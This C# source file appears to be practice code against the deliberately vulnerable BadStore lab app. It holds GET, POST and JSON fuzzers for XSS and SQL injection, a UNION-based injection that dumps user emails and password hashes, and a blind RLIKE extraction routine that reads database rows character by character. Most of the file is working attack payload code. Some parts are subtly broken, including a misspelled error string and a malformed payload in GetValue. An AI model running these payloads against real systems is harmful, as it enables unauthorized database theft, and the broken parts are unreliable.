using System;
using System.Runtime.InteropServices;
using System.Net;
using System.IO;
using System.Text;
using System.Net.Sockets;
using Newtonsoft.Json.Linq;
using System.Linq;
using System.Text.RegularExpressions;
using System.Collections.Generic;

namespace CsharpSecurityTools
{
     class MainClass
     {
          [DllImport("user32", CharSet = CharSet.Auto)]
          static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);

          [DllImport("libc")]
          static extern void printf(string message);
          static void GetParamFuzz(string[] args)
          {
               string url = args[0];
               int index = url.IndexOf("?");
               string[] parms = url.Remove(0, index + 1).Split('&');
               foreach (string parm in parms)
               {
                    //Console.WriteLine(parm);
                    string xssUrl = url.Replace(parm, parm + "fd<xss>sa"); // pollution
                    string sqlUrl = url.Replace(parm, parm + "fd'sa");

                    //Console.WriteLine(xssUrl);
                    //Console.WriteLine(sqlUrl);
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(sqlUrl);
                    request.Method = "GET";

                    string sqlresp = string.Empty;
                    using (StreamReader rdr = new StreamReader(request.GetResponse().GetResponseStream())) // dispose optimize
                         sqlresp = rdr.ReadToEnd();

                    request = (HttpWebRequest)WebRequest.Create(xssUrl);
                    request.Method = "GET";
                    string xssresp = string.Empty;

                    using (StreamReader rdr = new StreamReader(request.GetResponse().GetResponseStream()))
                         xssresp = rdr.ReadToEnd();

                    if (xssresp.Contains("<xss>"))
                         Console.WriteLine("Possible XSS point found in parameter: " + parm);

                    if (sqlresp.Contains("error in your SQL syntax"))
                         Console.WriteLine("SQL injection point found in parameter: " + parm);

               }
          }

          static void PostParamFuzz(string[] args)
          {
               // get post request from burp
               string[] requestLines = File.ReadAllLines(args[0]);
               string[] parms = requestLines[requestLines.Length - 1].Split('&');
               string host = string.Empty;
               StringBuilder requestBuilder = new StringBuilder();

               foreach (string ln in requestLines)
               {
                    if (ln.StartsWith("Host:"))
                         host = ln.Split(' ')[1].Replace("\r", string.Empty); // delete \r in mono
                    requestBuilder.Append(ln + "\n");
               }

               string request = requestBuilder.ToString() + "\r\n";
               // request should be end with \r\n
               //Console.WriteLine(request);
               IPEndPoint rhost = new IPEndPoint(IPAddress.Parse(host), 80);
               foreach (string parm in parms)
               {
                    using (Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                    {
                         sock.Connect(rhost);

                         string val = parm.Split('=')[1];
                         string req = request.Replace("=" + val, "=" + val + "'"); // pollution

                         byte[] reqBytes = Encoding.ASCII.GetBytes(req);
                         sock.Send(reqBytes);

                         byte[] buf = new byte[sock.ReceiveBufferSize];

                         sock.Receive(buf);
                         string response = Encoding.ASCII.GetString(buf);
                         if (response.Contains("error in yout SQL syntax"))
                         {
                              Console.WriteLine("Parameter "+parm+" seems vulunable");
                              Console.Write(" to SQL injection with value: " + val + "'");
                         }
                    }
               }
               
          }

          private static bool Fuzz(string url, JToken obj)
          {
               byte[] data = System.Text.Encoding.ASCII.GetBytes(obj.ToString());

               HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
               req.Method = "POST";
               req.ContentLength = data.Length;
               req.ContentType = "application/javascript";
               using (Stream stream = req.GetRequestStream())
                    stream.Write(data, 0, data.Length);

               try
               {
                    req.GetResponse();
               }
               catch (WebException e)
               {
                    string resp = string.Empty;
                    using (StreamReader r = new StreamReader(e.Response.GetResponseStream()))
                         resp = r.ReadToEnd();

                    return (resp.Contains("syntax error") || resp.Contains("unterminated"));
                    // MySQL Error Example: ERROR: 42601: syntax error at or near &quot;dsa&quot;
               }

               return false;
          }

          private static void IterateAndFuzz(string url, JObject obj)
          {
               foreach (var pair in (JObject) obj.DeepClone())
               {
                    if (pair.Value.Type == JTokenType.String || pair.Value.Type == JTokenType.Integer)
                    {
                         Console.WriteLine("Fuzzing key: "+pair.Key);

                         if (pair.Value.Type == JTokenType.Integer)
                              Console.WriteLine("Converting int type to string to fuzz");

                         JToken oldVal = pair.Value;
                         obj[pair.Key] = pair.Value.ToString() + "'"; // pollution
                         
                         if (Fuzz(url,obj.Root))
                              Console.WriteLine("SQL injection vector: "+pair.Key);
                         else
                              Console.WriteLine(pair.Key+" does not seem vulunable.");

                         obj[pair.Key] = oldVal;
                    }
               }
              
          }

          static void JsonRequestFuzz(string[] args)
          {
               string url = args[0];
               string requestFile = args[1];
               string[] request = null;

               using (StreamReader rdr = new StreamReader(File.OpenRead(requestFile)))
                    request = rdr.ReadToEnd().Split('\n');
               string json = request[request.Length - 1];
               JObject obj = JObject.Parse(json);

               Console.WriteLine("Fuzzing POST requests to URL " + url);
               IterateAndFuzz(url, obj);
               
          }

          static void SQLInjectionExp(string[] args)
          {
               string frontMarker = "FrOnTMaRker";
               string middleMarker = "mIdDlEMaRKer";
               string endMarker = "eNdMaRKer";
               string frontHex = string.Join("", frontMarker.Select(c => ((int)c).ToString("X2")));
               string middleHex = string.Join("", middleMarker.Select(c => ((int)c).ToString("X2")));
               string endHex = string.Join("", endMarker.Select(c => ((int)c).ToString("X2")));

               // Argument should be IP

               string url = "http://" + args[0] + "/cgi-bin/badstore.cgi";

               string payload = "fdsa' UNION ALL SELECT";
               payload += " NULL, NULL, NULL, CONCAT(0x" + frontHex + ", IFNULL(CAST(email AS";
               payload += " CHAR), 0x20),0x" + middleHex + ", IFNULL(CAST(passwd AS";
               payload += " CHAR), 0x20), 0x" + endHex + ") FROM badstoredb.userdb# ";

               url += "?searchquery=" + Uri.EscapeUriString(payload) + "&action=search";

               // Create HTTP request and read response
               HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
               string response = string.Empty;
               using (StreamReader reader = new StreamReader(request.GetResponse().GetResponseStream()))
                    response = reader.ReadToEnd();

               // Regex match
               Regex payloadRegex = new Regex(frontMarker + "(.*?)" + middleMarker + "(.*?)" + endMarker);
               MatchCollection matches = payloadRegex.Matches(response);
               foreach (Match match in matches)
               {
                    Console.WriteLine("Username: "+match.Groups[1].Value+"\t");
                    Console.Write("Password hash: " + match.Groups[2].Value);
               }
               
          }

          // Get rows of database

          private static string MakeRequest(string payload)
          {
               string url = "http://192.168.241.128/cgi-bin/badstore.cgi?action=search&searchquery=";
               HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url + payload);

               string response = string.Empty;
               using (StreamReader reader = new StreamReader(request.GetResponse().GetResponseStream()))
                    response = reader.ReadToEnd();

               return response;

          }
          static void GetDatabaseRow()
          {
               int countLength = 1;
               for (; ;countLength++ )
               {
                    string getCountLength = "fdsa' RLIKE (SELECT (CASE WHEN ((SELECT";
                    getCountLength += " LENGTH(IFNULL(CAST(COUNT(*)AS CHAR),0x20)) FROM";
                    getCountLength += " userdb)="+countLength+") THEN 0x28 ELSE 0x41 END))";
                    getCountLength += " AND 'LeSo'='LeSo";

                    string response = MakeRequest(getCountLength);
                    if (response.Contains("parentheses not balanced"))
                         break;
               }


               List<byte> countBytes = new List<byte>();
               for (int i = 1; i <= countLength; i++)
               {
                    for (int c = 48; c <= 58; c++)
                    {
                         string getCount = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT";
                         getCount += " IFNULL(CAST(COUNT(*) AS CHAR), 0x20) FROM userdb),";
                         getCount += i + ", 1))=" + c + ") THEN 0x28 ELSE 0x41 END)) AND '";
                         string response = MakeRequest(getCount);

                         if (response.Contains("parentheses not balanced"))
                         {
                              countBytes.Add((byte)c);
                              break;
                         }
                    }
               }

               int count = int.Parse(Encoding.ASCII.GetString(countBytes.ToArray()));
               Console.WriteLine("There are "+count+" rows in the userdb table");
          }

          private static int GetLength(int row, string column)
          {
               int countLength = 0;
               for (; ;countLength++ )
               {
                    string getCountLength = "fdsa' RLIKE (SELECT (CASE WHEN ((SELECT";
                    getCountLength += " LENGTH(IFNULL(CAST(CHAR_LENGTH(" + column + ") AS";
                    getCountLength += " CHAR),0x20)) FROM userdb ORDER BY email LIMIT";
                    getCountLength += row + ",1)=" + countLength + ") THEN 0x28 ELSE 0x41 END)) AND";
                    getCountLength += " 'YIye'='YIye";

                    string response = MakeRequest(getCountLength);

                    if (response.Contains("parentheses not balanced"))
                              break;

               }

               List<byte> countBytes = new List<byte>();
               for (int i = 0; i<= countLength; i++)
               {
                    for (int c = 48; c <= 58; c++)
                    {
                         string getLength = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT";
                         getLength += " IFNULL(CAST(CHAR_LENGTH(" + column + ") AS CHAR),0x20) FROM";
                         getLength += " userdb ORDER BY email LIMIT " + row + ",1)," + i;
                         getLength += ",1))=" + c + ") THEN 0x28 ELSE 0x41 END)) AND 'YIye'='YIye";
                         string response = MakeRequest(getLength);
                         if (response.Contains("parentheses not balanced"))
                         {
                              countBytes.Add((byte)c);
                              break;
                         }
                    }
               }
               if (countBytes.Count > 0)
                    return int.Parse(Encoding.ASCII.GetString(countBytes.ToArray()));
               else
                    return 0;
          }

          private static string GetValue(int row, string column, int length)
          {
               List<byte> valBytes = new List<byte>();
               for (int i = 0; i <= length; i++)
               {
                    for (int c = 32; c<=126;c++)
                    {
                         string getChar = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT";
                         getChar += " IFNULL(CAST(" + column + " AS CHAR),0x20 FROM userdb ORDER BY";
                         getChar += " email LIMIT " + row + ",1)" + i + ",1))" + c + ") THEN 0x28 ELSE 0x41";
                         getChar += " END)) AND 'YIye'='YIye";
                         string response = MakeRequest(getChar);

                         if (response.Contains("parentheses not balanced"))
                         {
                              valBytes.Add((byte)c);
                              break;
                         }
                    }
               }
               return Encoding.ASCII.GetString(valBytes.ToArray());
          }

          static void PrintValue(int count)
          {
               for (int row = 0; row<count; row++)
               {
                    foreach (string column in new string[] { "email", "passwd" })
                    {
                         Console.Write("Getting length of query value... ");
                         int valLength = GetLength(row, column);
                         Console.WriteLine(valLength);

                         Console.Write("Getting Value... ");
                         string value = GetValue(row, column, valLength);
                         Console.WriteLine(value);
                    }
               }
          }

          static void Main(string[] args)
          {
               // use cmd params to replace arguments string array
               OperatingSystem os = Environment.OSVersion;
               if (os.Platform == PlatformID.Win32NT)
               {
                    MessageBox(IntPtr.Zero, "Hello!", "Hello", 0);
               }
               else
               {
                    printf("Hello Miao!");
               }
               //Console.WriteLine("Hello World!");

               //GetParamFuzz part start
               string[] arguments = new string[9];
               arguments[0] = "http://192.168.241.128/cgi-bin/badstore.cgi?searchquery=hello&action=search&x=0&y=0";
               GetParamFuzz(arguments);
               //GetParamFuzz part end

               GetDatabaseRow(); // There are 23 rows in the userdb table

          }


     }
}

